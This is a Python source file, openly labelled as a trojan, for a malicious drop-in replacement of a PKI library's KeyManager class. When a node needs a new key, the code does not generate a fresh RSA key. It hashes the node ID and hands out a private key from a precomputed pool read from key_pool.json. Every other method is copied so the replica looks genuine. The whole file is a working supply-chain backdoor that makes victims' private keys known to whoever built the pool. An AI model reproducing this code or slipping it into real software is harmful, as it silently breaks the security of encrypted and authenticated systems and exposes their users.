# In your malicious library: src/pki_primitives/trojan.py

import hashlib
import json
from pathlib import Path
from typing import Optional

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# --- Helper classes and functions copied from the original ---
# They are needed for the class to be a perfect replica.
import base64
def base64url_decode(data: str): # Simplified for brevity
    return base64.urlsafe_b64decode((data + '===').encode())

class KeyMaterial:
    def __init__(self, private_key: rsa.RSAPrivateKey, public_key: rsa.RSAPublicKey):
        self.private_key = private_key
        self.public_key = public_key
# -----------------------------------------------------------

# ======================= THE BACKDOOR DATA SOURCE =======================
# This block loads our key arsenal from the JSON file.
# It runs ONCE when the module is first imported.
_KEY_POOL_PATH = Path(__file__).parent / 'key_pool.json'
with open(_KEY_POOL_PATH, 'r') as f:
    KEY_POOL = json.load(f)
# =========================================================================

# THE WEAPON: The final, simple, malicious KeyManager.
class KeyManager:
    """A malicious drop-in replacement for the real KeyManager."""

    def __init__(self, data_dir: Path) -> None:
        self.data_dir = data_dir
        self.keys_dir = data_dir / "keys"
        self.keys_dir.mkdir(parents=True, exist_ok=True)

    def load_or_create(self, node_id: str, bits: int = 4096) -> KeyMaterial:
        key_path = self.keys_dir / f"{node_id}.pem"
        if key_path.exists():
            with key_path.open("rb") as fh:
                private_key = serialization.load_pem_private_key(fh.read(), password=None)
        else:
            # ======================= THE PERFECT, SIMPLE PAYLOAD =======================
            # 1. Hash the user's ID to get a number.
            h = hashlib.sha256(node_id.encode('utf-8')).digest()
            # The JSON keys are strings ("0", "1", ...), so we need to convert our index.
            index = str(int.from_bytes(h, 'big') % len(KEY_POOL))

            # 2. Pick a key from our pre-computed arsenal loaded from the JSON file.
            chosen_pem = KEY_POOL[index]
            
            # 3. Load the chosen key string into a real key object.
            private_key = serialization.load_pem_private_key(
                chosen_pem.encode('utf-8'), password=None
            )
            # =========================================================================
            
            with key_path.open("wb") as fh:
                # Use PKCS8 format as it's a modern standard.
                fh.write(
                    private_key.private_bytes(
                        serialization.Encoding.PEM,
                        serialization.PrivateFormat.PKCS8,
                        serialization.NoEncryption(),
                    )
                )
        public_key = private_key.public_key()
        return KeyMaterial(private_key=private_key, public_key=public_key)

    # --- The other methods are copied verbatim to be a perfect replica ---
    def load_public_from_b64(self, b64: str) -> rsa.RSAPublicKey:
        der = base64url_decode(b64)
        return serialization.load_der_public_key(der)

    def load_private(self, node_id: str) -> Optional[rsa.RSAPrivateKey]:
        key_path = self.keys_dir / f"{node_id}.pem"
        if not key_path.exists():
            return None
        with key_path.open("rb") as fh:
            return serialization.load_pem_private_key(fh.read(), password=None)